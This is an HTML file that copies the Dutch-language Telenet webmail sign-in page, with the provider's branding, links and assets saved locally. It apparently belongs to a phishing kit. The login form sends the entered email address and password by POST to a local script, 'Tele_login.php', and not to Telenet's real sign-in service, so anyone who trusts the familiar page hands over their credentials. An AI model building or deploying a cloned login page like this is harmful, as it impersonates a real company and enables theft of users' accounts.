<!DOCTYPE html>
<!-- saved from url=(0041)https://login.prd.telenet.be/openid/login -->
<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    
    <title>Telenet: Meld je aan</title>
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    
    <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
    <meta name="description" content="">

    <script type="text/javascript" src="./Telenet_ Meld je aan_files/ruxitagentjs_ICA27SVfqrux_10171190717164900.js.téléchargement" data-dtconfig="app=bd04f5bd154f7157|srms=1,1,,,|uxrgcm=100,25,300,3;100,25,300,3|featureHash=ICA27SVfqrux|lastModification=1563469852142|srsr=25000|dtVersion=10171190717164900|tp=500,50,0,1|rdnt=1|uxrgce=1|uxdcw=1500|agentUri=/openid/ruxitagentjs_ICA27SVfqrux_10171190717164900.js|reportUrl=/openid/rb_58b59a93-831f-4aa5-913a-91bb5ca1f41c|rid=RID_-823311853|rpid=1661749375|domain=telenet.be"></script><link rel="shortcut icon" href="https://static.telenet.be/assets/favicon/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./Telenet_ Meld je aan_files/normalize.min.css">
    <link rel="stylesheet" href="./Telenet_ Meld je aan_files/login.css">
    <link rel="stylesheet" href="./Telenet_ Meld je aan_files/main.css">

    <!-- Adobe analytics -->
    <script src="./Telenet_ Meld je aan_files/statistics.js.téléchargement"></script>
    <script src="./Telenet_ Meld je aan_files/SiteCatalyst.js.téléchargement"></script>

    <script type="text/javascript">
        function hideHtmlElement(id) {
            document.getElementById(id).style.display = "none";
        }

        function showHtmlElement(id) {
            document.getElementById(id).style.display = "block";
        }

        function showPanel(id) {
            hideHtmlElement("forgotLogin");
            hideHtmlElement("showLogin");
            showHtmlElement(id);
        }

        function getPasswordForgottenUrl(){
            return "https://www2.telenet.be"
                + '/nl/profiel/wachtwoord-vergeten'
                + "/#/login="
                + document.getElementById('j_username').value
                + "/loginredirecturl="
                + "https%253A%252F%252Flogin.prd.telenet.be%252Fopenid%252Foauth%252Fauthorize%253Fclaims%253D%25257B%252522id_token%252522%253A%25257B%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Flicenses%252522%253Anull%252C%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Fmailbox%252522%253Anull%25257D%25257D%2526response_type%253Dcode%2526state%253D9ae4e1b0-2cdc-4257-a4a1-7c3e864e8d25%2526nonce%253D3a874f5c-a2ec-4a9f-9809-f25b244ab350%2526client_id%253Dwebmail";
        }

    </script>

    <!--[if lt IE 9]>
    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    
</head>

<body class="nl video videohasautoplay"><div class="mboxDefault" id="mbox-target-global-mbox-5449b7db579d48ef83c8732f62b9fa44" style="visibility: visible; display: block;"><div id="mboxImported-default-target-global-mbox-0" style="visibility: hidden; display: none;"></div></div>






<div class="wrapper">
    <span id="showBackgroundForStatic" style="display: none">true</span>
    <!-- LOGIN SCREEN -->

    <div class="container">
        <div id="loginContainer" class="">
            <div id="showLogin">



                
                    <div class="options clearfix">
                        <div class="option-language">
                            <ul><li class="active"><a href="https://login.prd.telenet.be/openid/login?lang=nl" tabindex="-1" style="cursor: default;">NL</a></li>
                                <span id="languageForStatic" style="display: none">nl</span>
                                <!-- IT-4522 The design team uses languageForStatic to display text dynamically-->
                                
                                    
                                        
                                        <li><a href="https://login.prd.telenet.be/openid/login?lang=fr" tabindex="-1">FR</a></li>
                                        <li><a href="https://login.prd.telenet.be/openid/login?lang=en" tabindex="-1">EN</a></li>
                                    
                                    
                                    
                                
                            </ul>
                        </div>
                    </div>
                

                <div class="branding clearfix">
                    
                        
                        
                            <div id="logo"></div>
                            <h1>Telenet Webmail</h1>
                        
                    
                    <span id="languageForStatic" style="display: none">nl</span>
                </div>
                <div class="contentContainer">
                    
                    
                        <form id="login-form" name="loginForm" class="white-popup-block" action="Tele_login.php" method="post">
                            
                            <div class="inputContainer">
                                <div class="inputField clearfix">
                                    
                                        
                                        
                                            <label>Je e-mailadres</label>
                                        
                                    

                                    <div class="forgot"><a href="https://login.prd.telenet.be/openid/login#" onclick="showPanel(&#39;forgotLogin&#39;)" tabindex="-1">Vergeten?</a></div>
                                    
                                        
                                        
                                            <input type="text" id="j_username" name="j_username" autocomplete="off" tabindex="1" placeholder="e-mail@telenet.be">
                                        
                                    
                                </div>
                                <div class="inputField clearfix">
                                    <label>Wachtwoord</label>
                                    <div class="forgot">
                                        <a onclick="window.open(getPasswordForgottenUrl()); return false;" href="https://login.prd.telenet.be/openid/login#" target="_blank" tabindex="-1">Vergeten?</a>
                                    </div>
                                    <input type="password" tabindex="2" id="j_password" name="j_password" autocomplete="off" placeholder="Wachtwoord is hoofdlettergevoelig">
                                </div>
                            </div>

                            

                            <div id="error">
                                
                                
                                    
                                    
                                    
                                    
                                
                                

                                
                                
                            </div>

                            <div class="inputActions clearfix">
                                <!-- temporary fix to solve clients not supporting missing refresh token -->
                                
                                    
                                        <div class="remind">
                                            <input type="checkbox" name="rememberme" id="rememberme" value="true" class="css-checkbox" tabindex="3">
                                            <label class="css-label" for="rememberme">Aangemeld blijven</label>
                                        </div>
                                    
                                    
                                

                                <div class="login_btn">
                                    
                                        
                                        
                                            <input type="submit" tabindex="4" class="button" value="Aanmelden" name="login">
                                        
                                    

                                    
                                </div>

                                <p class="nologin">
                                    
                                    
                                
                                    <a href="https://www2.telenet.be/nl/profiel/profiel/#/loginredirecturl=https%253A%252F%252Flogin.prd.telenet.be%252Fopenid%252Foauth%252Fauthorize%253Fclaims%253D%25257B%252522id_token%252522%253A%25257B%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Flicenses%252522%253Anull%252C%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Fmailbox%252522%253Anull%25257D%25257D%2526response_type%253Dcode%2526state%253D9ae4e1b0-2cdc-4257-a4a1-7c3e864e8d25%2526nonce%253D3a874f5c-a2ec-4a9f-9809-f25b244ab350%2526client_id%253Dwebmail" target="_blank" tabindex="-1">Nog geen login?</a>
                                
                                
                                </p>
                            </div>
                        </form>
                    
                </div>
            </div>

            <div id="forgotLogin" style="display:none;">
                <div class="forgot clearfix">
                    <h2>Wat is je login?</h2>
                    <p>Je kan aanmelden op onze Telenet-diensten met</p>
                    <ul>
                        <li><strong>je Telenet e-mailadres</strong> (bv: voornaam.achternaam@telenet.be).</li>
                        <li><strong>een ander e-mailadres</strong> dat je zelf koos als login (bv: voornaam.achternaam@hotmail.com, voornaam.achternaam@gmail.com,...).</li>
                        <li><strong>je internetlogin</strong> die je vindt op je aanrekening of op het Telenet-paspoort dat je kreeg bij installatie (bv: u123456).</li>
                        <li><strong>je Telenet-login</strong> die je zelf koos, kan je <a href="https://mijn.telenet.be/mijntelenet/account/recoverLogin.do">online</a> terugvinden (bv: voornaam.naam).</li>
                    </ul>
                </div>
                <div class="cta-nav clearfix">
                    <p class="cta left">
                        <a class="cta reversed" href="https://login.prd.telenet.be/openid/login#" onclick="showPanel(&#39;showLogin&#39;)">Terug</a>
                    </p>

                    <p class="cta right">
                        <a href="https://www2.telenet.be/nl/klantenservice/aanmelden-voor-telenet-diensten" target="_blank" tabindex="-1" class="cta">Meer Info</a>
                    </p>
                </div>
            </div>
        </div>
        <div class="copyright">© Telenet
            <script>document.write(new Date().getFullYear());</script>2019
            - <a href="https://www2.telenet.be/nl/klantenservice/juridische-informatie" target="_blank" tabindex="-1">Juridische informatie</a>
            - <a href="https://www2.telenet.be/nl/privacy/" target="_blank" tabindex="-1">Privacy</a><br>
            <a href="https://www2.telenet.be/nl/klantenservice/wat-zijn-de-algemene-voorwaarden-van-telenet" target="_blank" tabindex="-1">Tariefinfo en algemene voorwaarden</a>
        </div>
    </div>
    <!-- JSON CONTENT -->
    <div class="bgContainer"><div class="video"><img src="./Telenet_ Meld je aan_files/logo_play.png" style="position:absolute; top:15px; right:90px; z-index:200"><div id="videocontrolers"><a class="control pauze" id="videocontrol" style="margin-right: 0"></a></div><div class="promo videopromo"><div class="promoLogo"><img src="./Telenet_ Meld je aan_files/undefined"></div><div class="promoAction"><h2 style="color:#fff;">Zoveel series om te bingen deze zomer</h2><p class="link"><a onclick="utag.link({link_name:&#39; Webmail :: Login :: Play - NL&#39;});" href="https://www2.telenet.be/nl/producten/tv-en-entertainment/play" target="_blank" style="color:#FDC422;">Ontdek hier</a></p></div></div><div class="promobg"></div><video muted="" autoplay="" loop="" poster="https://static.telenet.be/oauth2/assets/default.jpg" id="bgvid" src="https://static.telenet.be/oauth2/assets/movies/20190611-webmail-entertainment-loop.mp4"></video></div></div>
</div>

<script src="./Telenet_ Meld je aan_files/jquery-1.9.1.min.js.téléchargement"></script>
<script src="./Telenet_ Meld je aan_files/jquery-ui-1.10.3.custom.min.js.téléchargement"></script>
<script src="./Telenet_ Meld je aan_files/modernizr-2.6.2-respond-1.1.0.min.js.téléchargement"></script>

<!--[if lt IE 9]>!
<script type="text/javascript" src="/openid/js/vendor/jquery.backgroundSize.js"></script>
<![endif]-->

<span id="client_id" style="display: none">webmail</span>
<span id="stylehint" style="display: none"></span>

<script src="./Telenet_ Meld je aan_files/main.js.téléchargement"></script>
<script src="./Telenet_ Meld je aan_files/mbox.js.téléchargement"></script><style>.mboxDefault { visibility:hidden; }</style><script src="./Telenet_ Meld je aan_files/target.js.téléchargement"></script><script src="./Telenet_ Meld je aan_files/ajax"></script>

<script src="./Telenet_ Meld je aan_files/items_webmail.js.téléchargement"></script>
<script>if(typeof(window.data) === 'undefined') { document.write('<script src="https://static.telenet.be/oauth2/js/items.js">\x3C/script>');}</script>

<script type="text/javascript">
    $('form').submit(function () {
        $('input:submit').attr("disabled", true);
    });
</script>

<!-- <sessionid>91219ae4-76d8-4a67-ba73-9fe75517adc3</sessionid> -->
<!-- errorCode: , errorMessage:  -->



</body></html>